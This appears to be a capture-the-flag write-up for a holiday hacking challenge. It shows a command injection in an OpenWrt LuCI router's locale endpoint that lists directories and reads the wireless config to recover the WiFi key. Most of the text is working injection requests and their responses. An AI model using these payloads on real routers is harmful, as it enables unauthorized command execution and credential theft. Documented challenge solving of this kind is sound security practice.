# Dosis Network Down

## Objective

Difficulty: ❄️ ❄️  
[Hints](./docs/HHC_2025/neighborhood/hints/hint-dosis_network_down.md) and [Conversations](./docs/HHC_2025/neighborhood/hints/chat-janusz_jasinski.md)

Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?

## Solution / Flag

> SprinklesAndPackets2025!

## Detailed Solution

Using Burp with the repeater, tamper the GET to inject with commands

Injecting commands - Getting ls to work.  Initially, some strings were sent with double or single quotes, but quotes were not required.  Only URL Encoding was required.  

```bash
# Request URL
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls) HTTP/2

# Response
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=38e7e388-9800-449c-bbe6-22678f7dfbb9; Path=/
X-Cloud-Trace-Context: aec078b7c199cb88f14d2170a90d4973;o=1
Date: Sat, 22 Nov 2025 13:43:13 GMT
Server: Google Frontend
Content-Length: 78
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

bin
cgi-bin
dev
etc
home
lib
lib64
mnt
opt
proc
root
sbin
sys
tmp
usr
var
www
```

Getting the syntax to work with spaces required URL Encoding the string

```bash
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls%20%2Fetc) HTTP/2

# Response
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=63e7cca6-a921-4b1c-bc61-bcc071ae7253; Path=/
X-Cloud-Trace-Context: 5553bc9669f26fcb207c1f8f95c0c46f
Date: Sat, 22 Nov 2025 13:41:48 GMT
Server: Google Frontend
Content-Length: 153
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

banner
config
device_info
group
hostapd.conf
hostname
hosts
hotplug.d
init.d
motd
openwrt_release
openwrt_version
passwd
profile
rc.d
resolv.conf
shadow
```

Navigating to typical config directory to see what's available

```bash
# Request URL
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls%20%2Fetc%2Fconfig) HTTP/2

# Response
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=d4cc3aa4-d122-4760-a58d-79deb2e23ae3; Path=/
X-Cloud-Trace-Context: 446f9d8f66e70fb7b13346548624843f
Date: Sat, 22 Nov 2025 13:40:57 GMT
Server: Google Frontend
Content-Length: 43
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

dhcp
firewall
leds
network
system
wireless
```

Continuing to drill down

```bash
# Request URL
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls%20%2Fetc%2Fconfig%2Fwireless) HTTP/2

# Response
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=b2bfa8b0-55ea-4938-bfdb-3f04f351d85f; Path=/
X-Cloud-Trace-Context: f1a3330929d4c42946fedf592b73b45b
Date: Sat, 22 Nov 2025 13:39:47 GMT
Server: Google Frontend
Content-Length: 21
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

/etc/config/wireless
```

Final tamper

```bash
# Request URL
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20%2Fetc%2Fconfig%2Fwireless) HTTP/2

# Response
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=7870d45e-b0c2-4156-9a00-41eff7e951d9; Path=/
X-Cloud-Trace-Context: 9a5e9b89b46473c3f22f662318999576;o=1
Date: Sat, 22 Nov 2025 13:34:35 GMT
Server: Google Frontend
Content-Length: 744
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

config wifi-device 'radio0'
	option type 'mac80211'
	option channel '6'
	option hwmode '11g'
	option path 'platform/ahb/18100000.wmac'
	option htmode 'HT20'
	option country 'US'

config wifi-device 'radio1'
	option type 'mac80211'
	option channel '36'
	option hwmode '11a'
	option path 'pci0000:00/0000:00:00.0'
	option htmode 'VHT80'
	option country 'US'

config wifi-iface 'default_radio0'
	option device 'radio0'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_2.4G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
	option device 'radio1'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_5G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'
```

Go back to the objective and enter the wifi password

```bash
SprinklesAndPackets2025!
```

## References

* https://www.exploit-db.com/exploits/51677  
* https://www.urlencoder.io/
  

## Game Location

![alt text](./docs/HHC_2025/neighborhood/24-seven/dosis_network.png)
